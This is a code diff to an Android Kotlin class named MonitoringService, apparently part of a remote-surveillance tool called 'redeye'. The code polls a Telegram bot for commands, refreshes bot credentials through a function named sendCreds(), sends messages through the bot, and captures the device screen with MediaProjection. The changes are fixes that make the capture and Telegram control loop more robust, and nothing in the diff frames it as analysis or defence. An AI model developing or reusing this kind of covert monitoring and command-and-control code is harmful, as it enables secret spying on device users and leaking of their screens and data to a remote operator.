@@ -956,7 +956,7 @@ class MonitoringService : Service() {
             } catch (_: Exception) {
             }
             val (freshToken, freshChat) = sendCreds()
-            if (freshToken.isNotEmpty() && freshToken != botToken) {
+            if (freshToken.isNotEmpty() && (freshToken != botToken || freshChat != chatId)) {
                 val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
                 response = try {
                     TelegramClient.api.getUpdates(retryUrl)
@@ -2821,7 +2821,7 @@ class MonitoringService : Service() {
                     }
                     return false
                 }
-                val plain = message.replace(TAG_STRIP_REGEX, "").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&#x27;", "'").replace("&amp;", "&")
+                val plain = message.replace(TAG_STRIP_REGEX, "").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&#x27;", "'").replace("&apos;", "'").replace("&amp;", "&")
                 if (plain != message) {
                     try {
                         val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
@@ -3391,8 +3391,9 @@ class MonitoringService : Service() {
             val scale = if (width > 720) 720f / width else 1f
             width = (width * scale).toInt()
             height = (height * scale).toInt()
+            val density = (metrics.densityDpi * scale).toInt().coerceAtLeast(1)
             reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
-            display = projection.createVirtualDisplay("redeye-shot", width, height, metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+            display = projection.createVirtualDisplay("redeye-shot", width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
             var image: android.media.Image? = null
             for (i in 0 until 12) {
                 try { image = reader.acquireLatestImage() } catch (_: Exception) { }
@@ -3401,8 +3402,13 @@ class MonitoringService : Service() {
             }
             val img = image ?: return null
             try {
-                val plane = img.planes[0]
-                val rowWidth = plane.rowStride / plane.pixelStride
+                val planes = try { img.planes } catch (_: Exception) { null }
+                if (planes == null || planes.isEmpty()) return null
+                val plane = planes[0]
+                val stride = try { plane.pixelStride } catch (_: Exception) { 0 }
+                if (stride <= 0 || height <= 0) return null
+                val rowWidth = plane.rowStride / stride
+                if (rowWidth < width) return null
                 val bmp = Bitmap.createBitmap(rowWidth, height, Bitmap.Config.ARGB_8888)
                 bmp.copyPixelsFromBuffer(plane.buffer)
                 val cropped = if (rowWidth != width) Bitmap.createBitmap(bmp, 0, 0, width, height) else bmp
